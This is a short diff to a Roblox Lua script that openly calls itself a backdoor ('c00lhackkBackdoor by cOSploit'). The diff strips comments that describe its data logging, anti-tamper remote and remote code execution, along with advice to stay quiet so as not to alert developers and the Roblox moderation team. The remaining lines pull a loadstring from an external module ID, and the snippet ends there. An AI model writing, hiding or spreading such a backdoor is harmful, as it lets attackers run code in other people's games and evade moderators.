@@ -1,8 +1,3 @@
--- mustTalk determines whether the backdoor provider should print out stuff in the console or not
--- recommended to keep mustTalk off, as it can invoke the devs and Roblox mod team
--- mustTalk will not prevent data logging!
--- ON = true
--- OFF = false
 local mustTalk = false
 
 local print = print
@@ -15,21 +10,6 @@ if game:GetService("RunService"):IsStudio() then
 end
 
 print("[[-- Infected with c00lhackkBackdoor by cOSploit --]]")
-
--- Features we have:
--- -- Data logging
--- -- Anti-tamper remote
--- -- Compatibility with any backdoor scanner
--- -- Multiple code execution support
-
--- INTERACTION WITH THE BACKDOOR WILL EXPOSE YOU!
--- DATA INCLUDED:
--- -- player that executed the backdoor
--- -- code that is sent thru
--- -- success indicator
--- -- error message or returned values
--- SCARED TO HAVE YOUR C00LGUI LEAKED? BOOHOO, SKID!
-]])
 
 local loadstring = require(14132891321)
 local rmt
